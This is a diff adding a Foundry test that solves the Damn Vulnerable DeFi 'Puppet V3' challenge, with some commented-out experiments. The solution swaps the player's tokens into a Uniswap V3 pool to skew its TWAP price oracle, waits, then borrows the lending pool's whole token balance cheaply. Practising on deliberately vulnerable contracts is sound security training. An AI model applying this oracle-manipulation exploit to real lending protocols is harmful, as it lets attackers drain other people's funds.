@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +120,75 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
+        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+        // console.log(address(token));
+        // console.log(address(weth));
+        // console.log(uniswapPool.token0());
+        // console.log(uniswapPool.token1());
+
+        // weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        // console.log(token.balanceOf(player));
+        // console.log(weth.balanceOf(player));
+
+      
+        token.approve(address(uniswapPool), type(uint256).max);
+        weth.approve(address(uniswapPool), type(uint256).max);
+        // uniswapPool.swap(player, true, 1e5, TickMath.getSqrtRatioAtTick(-60001), "");
+
+
+        // bool isWethFirst = address(weth) < address(token);
+        // address token0 = isWethFirst ? address(weth) : address(token);
+        // address token1 = isWethFirst ? address(token) : address(weth);
+
+        // price token0/token1 = 1.0001 6 ^ tick
         
+        // Deployer adds liquidity at current price to Uniswap V3 exchange
+        // weth.approve(address(positionManager), type(uint256).max);
+        // token.approve(address(positionManager), type(uint256).max);
+        // positionManager.mint(
+        //     INonfungiblePositionManager.MintParams({
+        //         token0: token0,
+        //         token1: token1,
+        //         tickLower: -100,
+        //         tickUpper: 100,
+        //         fee: FEE,
+        //         recipient: player,
+        //         amount0Desired: 1e16,
+        //         amount1Desired: 1e16,
+        //         amount0Min: 0,
+        //         amount1Min: 0,
+        //         deadline: block.timestamp
+        //     })
+        // );
+
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+         console.log(token.balanceOf(player));
+        console.log(weth.balanceOf(player));
+
+        
+        ISwapRouter uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        ISwapRouter.ExactInputSingleParams memory swapParams = ISwapRouter.ExactInputSingleParams({
+            tokenIn: address(token),
+            tokenOut: address(weth),
+            fee: 3000,
+            deadline: block.timestamp,
+            recipient: player,
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+            });
+
+        uniswapRouter.exactInputSingle(swapParams);
+
+        console.log(token.balanceOf(player));
+        console.log(weth.balanceOf(player));
+
+        skip(114);
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
